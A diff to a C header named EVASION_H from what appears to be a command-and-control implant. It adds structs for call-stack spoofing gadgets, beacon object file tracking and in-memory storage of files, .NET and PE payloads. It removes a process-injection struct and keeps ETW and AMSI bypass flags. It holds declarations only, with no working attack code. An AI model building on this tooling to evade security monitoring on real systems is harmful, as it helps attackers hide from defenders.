@@ -7,6 +7,20 @@
 #define DOTNET_BYPASS_ETW  0x400
 #define DOTNET_BYPASS_AMSI 0x700
 
+/* =========== [ Spoof ] ========= */
+
+struct _FRAME_INFO {
+    UPTR Ptr;  // pointer to function + offset
+    UPTR Size; // stack size
+};
+typedef _FRAME_INFO FRAME_INFO;
+
+struct _GADGET_INFO {
+    UPTR Ptr;  // pointer to gadget
+    UPTR Size; // stack size
+};
+typedef _GADGET_INFO GADGET_INFO;
+
 struct _STACK_FRAME {
     WCHAR* DllPath;
     ULONG  Offset;
@@ -62,26 +76,6 @@ typedef struct {
     UPTR  Instruction;
 } EXT, *PEXT;
 
-/* ======== [ Injection ] ======== */
-
-struct _INJ_OBJ {
-    HANDLE PsHandle;
-    ULONG  ProcessId;
-    HANDLE ThreadHandle;
-    ULONG  ThreadId;
-    PVOID  BaseAddress;
-    BOOL   Persist;
-
-    ULONG ForkCategory;
-    ULONG ExecMethod;
-    ULONG ExplicitPid;
-
-    CHAR*  TargetDll; // stomp case
-
-    ULONG ObjID;
-};
-typedef _INJ_OBJ INJ_OBJ;
-
 enum eMask {
     Timer = 1,
     Pooling,
@@ -107,5 +101,37 @@ enum Reg {
 #define CALLBACK_NO_PRE_MSG  0x4f
 #define CALLBACK_CUSTOM      0x1000
 #define CALLBACK_CUSTOM_LAST 0x13ff
+
+struct _BOF_OBJ {
+    PVOID MmBegin;
+    PVOID MmEnd;
+    CHAR* UUID;
+    ULONG CmdID;
+
+    struct _BOF_OBJ* Next;
+};
+typedef _BOF_OBJ BOF_OBJ;
+
+struct _DATA_STORE {
+    INT32  Type;
+    UINT64 Hash;
+    BOOL   Masked;
+    CHAR*  Buffer;
+    SIZE_T Length;
+};
+typedef _DATA_STORE DATA_STORE;
+
+#define DATA_STORE_TYPE_EMPTY        0
+#define DATA_STORE_TYPE_GENERAL_FILE 1
+#define DATA_STORE_TYPE_DOTNET       2
+#define DATA_STORE_TYPE_PE           3
+#define DATA_STORE_TYPE_BOF          4
+
+struct _USER_DATA {
+    CHAR*  Key;
+    PVOID  Ptr;
+    struct _USER_DATA* Next;
+};
+typedef _USER_DATA VALUE_DICT;
 
 #endif // EVASION_H
